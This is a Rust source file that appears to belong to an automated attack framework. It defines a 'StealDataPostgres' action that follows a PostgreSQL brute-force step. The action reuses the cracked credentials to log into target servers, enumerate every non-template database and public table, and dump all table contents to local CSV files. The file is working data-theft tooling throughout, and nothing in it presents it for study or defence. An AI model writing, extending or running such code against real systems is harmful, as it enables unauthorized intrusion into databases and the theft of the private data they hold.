use std::sync::Arc;
use std::time::Duration;

use tokio::time::timeout;

use crate::actions::{Action, ActionOutcome, Target};
use crate::state::AppState;

use super::{build_output_dir, get_credentials};

/// Steal data from PostgreSQL servers by dumping tables.
/// Parent: PostgresBruteforce.
pub struct StealDataPostgres;

impl Action for StealDataPostgres {
    fn name(&self) -> &'static str { "StealDataPostgres" }
    fn port(&self) -> Option<u16> { Some(5432) }
    fn parent(&self) -> Option<&'static str> { Some("PostgresBruteforce") }

    fn execute<'a>(
        &'a self,
        target: &'a Target,
        state: &'a Arc<AppState>,
    ) -> std::pin::Pin<Box<dyn std::future::Future<Output = ActionOutcome> + Send + 'a>> {
        Box::pin(run(target, state))
    }
}

async fn run(target: &Target, state: &Arc<AppState>) -> ActionOutcome {
    let creds = get_credentials(state, target.host_id, "postgres").await;
    if creds.is_empty() {
        return ActionOutcome::Failed("no credentials".to_string());
    }

    let local_dir = build_output_dir(state, "postgres", &target.mac_address, &target.ip);
    let _ = tokio::fs::create_dir_all(&local_dir).await;

    for (user, password) in &creds {
        if state.shutdown.is_cancelled() {
            break;
        }

        let result = timeout(Duration::from_secs(240), async {
            steal_postgres_data(&target.ip, user, password, &local_dir).await
        })
        .await;

        match result {
            Ok(Ok(count)) if count > 0 => {
                tracing::info!(ip = %target.ip, tables = count, "PostgreSQL data stolen");
                return ActionOutcome::Success;
            }
            Ok(Err(e)) => tracing::warn!(ip = %target.ip, %e, "PostgreSQL steal error"),
            _ => {}
        }
    }

    ActionOutcome::Failed("no data stolen".to_string())
}

async fn steal_postgres_data(
    ip: &str,
    user: &str,
    password: &str,
    local_dir: &std::path::Path,
) -> Result<usize, String> {
    // Step 1: List databases
    let db_output = tokio::process::Command::new("psql")
        .env("PGPASSWORD", password)
        .env("PGCONNECT_TIMEOUT", "10")
        .args([
            "-h", ip, "-U", user,
            "-t", "-A", "-c",
            "SELECT datname FROM pg_database WHERE datistemplate = false AND datname NOT IN ('postgres')",
        ])
        .output()
        .await
        .map_err(|e| e.to_string())?;

    if !db_output.status.success() {
        return Err("failed to list databases".to_string());
    }

    let databases: Vec<String> = String::from_utf8_lossy(&db_output.stdout)
        .lines()
        .filter(|l| !l.trim().is_empty())
        .map(|s| s.trim().to_string())
        .collect();

    let mut total_tables = 0;

    for db in &databases {
        // Step 2: List tables
        let tables_output = tokio::process::Command::new("psql")
            .env("PGPASSWORD", password)
            .env("PGCONNECT_TIMEOUT", "10")
            .args([
                "-h", ip, "-U", user, "-d", db,
                "-t", "-A", "-c",
                "SELECT tablename FROM pg_tables WHERE schemaname = 'public'",
            ])
            .output()
            .await;

        let tables: Vec<String> = match tables_output {
            Ok(o) if o.status.success() => String::from_utf8_lossy(&o.stdout)
                .lines()
                .filter(|l| !l.trim().is_empty())
                .map(|s| s.trim().to_string())
                .collect(),
            _ => continue,
        };

        let db_dir = local_dir.join(db);
        let _ = tokio::fs::create_dir_all(&db_dir).await;

        // Step 3: Dump each table to CSV using COPY
        for table in &tables {
            let csv_path = db_dir.join(format!("{table}.csv"));
            let copy_cmd = format!("COPY (SELECT * FROM public.{table}) TO STDOUT WITH CSV HEADER");

            let dump = tokio::process::Command::new("psql")
                .env("PGPASSWORD", password)
                .env("PGCONNECT_TIMEOUT", "10")
                .args(["-h", ip, "-U", user, "-d", db, "-c", &copy_cmd])
                .output()
                .await;

            if let Ok(o) = dump {
                if o.status.success() {
                    let _ = tokio::fs::write(&csv_path, o.stdout).await;
                    total_tables += 1;
                }
            }
        }
    }

    Ok(total_tables)
}
